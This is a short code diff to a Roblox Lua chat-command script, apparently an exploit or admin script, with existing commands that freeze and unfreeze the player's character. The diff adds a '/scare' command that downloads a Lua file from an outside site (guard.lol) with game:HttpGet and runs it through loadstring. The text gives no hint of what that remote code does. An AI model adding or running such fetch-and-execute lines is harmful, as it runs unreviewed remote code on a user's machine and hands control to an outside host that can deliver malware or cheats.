@@ -27,6 +27,11 @@ game.Players.LocalPlayer.Character.Humanoid.Sit = true
   game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
  end
  
+ 
+ if msg:lower():sub(1,13) == "/scare" then
+  loadstring(game:HttpGet("https://guard.lol/scripts/universalscript.lua",true))()
+ end
+ 
  if msg:lower():sub(1,13) == "/unfreeze" then
 game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
  end
